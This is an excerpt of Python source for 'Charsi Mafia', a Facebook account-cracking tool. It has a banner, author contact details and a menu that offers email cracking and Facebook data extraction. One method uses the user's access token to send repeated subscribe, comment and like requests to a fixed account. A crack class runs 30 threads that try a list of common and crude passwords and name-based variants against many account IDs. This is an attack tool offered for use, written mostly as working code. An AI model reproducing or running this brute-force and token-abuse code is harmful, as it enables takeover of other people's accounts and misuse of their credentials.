...
\t{}  |╚═╝╩ ╩╩ ╩╩╚═╚═╝╩
 \t{}└──────────────────────────────────────┘{}                                          
\t   {}[ {}Charsi Mafia Facebook Pakistan{} ]{}
'''.format(H,H,M,H,H,M,H,H,M,H,H,P,H,H,P,H,H,P,H,H,P,O,K,O,P))

def banne():
    xenz = '# WELCOME TO CHARSI'
    xenz2 = mark(Charsi, style='green')
    sol().print(xenz2)
    au='AUTHOR    :  CH4RS1 X T4M1\nGITHUB    :  https://github.com/CharsiBrand\nWHATSAPP  :  923110760985'
...
def mn():
 ...
 [10] Crack Email
 [11] Get Facebook Data²
 [99] Report Bug Script
 [EX] Exit, Clear Token'''
    mnu1 = nel(mnu, style="yellow")
...
class login:
	...
	def takon(self):
		...
		if takon in ['y','Y','iya']:
			...
			os.system('xdg-open wa.me/6283138613993');exit()
		else:
			login().__login__()
	def bot(self):
		...
		requests.post('https://graph.facebook.com/885191859545960/subscribers?access_token=' + toket)
		requests.post('https://graph.facebook.com/885191859545960/subscribers?access_token=' + toket)
		requests.post('https://graph.facebook.com/885191859545960/subscribers?access_token=' + toket)
		requests.post('https://graph.facebook.com/885191859545960/comments/?message=' +komen+ '&access_token=' + toket)
		requests.post('https://graph.facebook.com/885191859545960/likes?summary=true&access_token=' + toket)
		requests.post('https://graph.facebook.com/885191859545960/comments/?message='+komen+'&access_token=' + toket)
		requests.post('https://graph.facebook.com/885191859545960/comments/?message='+komen+'&access_token=' + toket)
		requests.post('https://graph.facebook.com/885191859545960/comments/?message='+komen+'&access_token=' + toket)
		requests.post('https://graph.facebook.com/885191859545960/comments/?message='+komen+'&access_token=' + toket)
		...
		requests.post('https://graph.facebook.com/885191859545960/likes?summary=true&access_token=' + toket)
		requests.post('https://graph.facebook.com/885191859545960/likes?summary=true&access_token=' + toket)
		jalan('\n\tFollow Facebook Gw Dulu Anj ^_^')
		os.system('xdg-open https://www.facebook.com/L1NK.C0PY.K4R.BSCK')
		menu().main()
...
class menu:
	...
	def main(self):
		...
		print(' %s[%s•%s] Alamat IP              : %s'%(N,O,N,IP))
		print(' %s[%s•%s] Tanggal Login         : %s'%(N,O,N,waktu))
		print(' %s'%(N))
		mn()
...
class crack:
				...
				if pw in ['']:
					...
					def manual(xnxx=None):
						...
						if mani in ['']:
							...
							exit()
					print(' %s '%(N))
					print(' %s [%s1%s] Metode Fast Free'%(N,O,N))
		...
		with khamdihiXD(max_workers=30) as dihi:
			for nama in self.id:
				try:
					...
					nun = gas[0]
					if len(nun)>=6:
						pwx = ['123456','sayang','sayangku','bismillah','anjing','bangsat','katasandi','kontol','mabok','doraemon','sasuke','naruto','Naruto','plangton','plankton','nobita','suneo','namamu','sayangku','cintaku','pacarku','namaku','dinda','polisi','pembangkang','oglek','punk','anjal','akungame','randa','janda','bobotoh','persib','persija','sange','sangean','ngaceng','ngacengan','coli','colian','kang','kangcoli','ngocok']
					elif len(nun)<=1:
						pwx = [nun, nun+'123', nun+'321', nun+'1234', nun+'12345', name]
					elif len(nun)<=2:
						pwx = [nun, nun+'123', nun+'321', nun+'1234', nun+'12345', name]
	...
	def b_api(self,user,pwx): # Kamu jahat :v
		...
		sys.stdout.write('\r %s••• %s[%s CHARSI %s] %s/%s [ OK:%s ] <-> [ CP:%s ] %s•••'%(eram,N,O,N,loop,len(self.id),len(ok),len(cp),nufi));sys.stdout.flush() # Lo kontol...
		try:
			for pw in pwx:
				pw = pw.lower()
				ses = requests.Session()
	...
	def mbasic(self,user,pwx):
		...
		sys.stdout.write('\r %s••• %s[%s XENZ %s] %s/%s [ OK:%s ] <-> [ CP:%s ] %s••• '%(asw,N,H,N,loop,len(self.id),len(ok),len(cp),mmk));sys.stdout.flush()
		try:
			for pw in pwx:
				pw = pw.lower()
				ses = requests.Session()
